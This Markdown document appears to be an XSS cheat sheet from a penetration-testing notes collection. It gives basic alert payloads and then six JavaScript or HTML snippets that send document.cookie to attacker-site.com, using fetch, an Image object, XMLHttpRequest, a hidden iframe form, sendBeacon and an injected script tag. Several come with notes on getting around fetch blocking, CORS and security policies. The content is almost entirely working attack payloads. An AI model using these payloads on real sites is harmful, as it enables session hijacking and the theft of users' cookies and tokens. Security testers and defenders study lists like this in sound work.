## XSS

![XSS-variants](https://github.com/user-attachments/assets/0f908703-6b48-4424-acb2-7487e776765d)

### Basics:
```
<script>alert(1)</script>
javascript:alert(1)
"onmouseover="alert(1)
\'-alert(1)//
<svg/onload=prompt(1337);>
```

### Obtain cookies or tokens:

#### Sending cookies to an external server via fetch
```
fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(document.cookie));
```

#### Using the Image object to transfer cookies (workaround)
```
let img = new Image();
img.src = 'https://attacker-site.com/log?cookie=' + encodeURIComponent(document.cookie);
```
- Bypassing security policies that block data transfer via "Fetch"

#### XMLHttpRequest with sending cookies in a GET or POST request
```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker-site.com/steal?cookie=' + encodeURIComponent(document.cookie), true);
xhr.send();
```
- support for XMLHttpRequest, but fetch may be blocked

#### Using the form to transfer cookies through a hidden iframe
```
<iframe style="display:none;" name="steal-frame"></iframe>
<form action="https://attacker-site.com/log" method="POST" target="steal-frame">
    <input type="hidden" name="cookie" value="<script>document.cookie</script>">
</form>
<script>document.forms[0].submit();</script>
```
- Bypassing restrictions for XHR and CORS; invisible to the user

#### navigator.sendBeacon to transfer cookies to the backend
```
navigator.sendBeacon('https://attacker-site.com/steal-cookies', 'cookie=' + encodeURIComponent(document.cookie));
```
- Optimized for actions that are performed before closing the page; bypasses some policies that block other transfer methods

#### Inserting a call into the event handler (onload, onerror) through dynamically created elements
```
let script = document.createElement('script');
script.src = 'https://attacker-site.com/steal?cookie=' + encodeURIComponent(document.cookie);
document.body.appendChild(script);
```
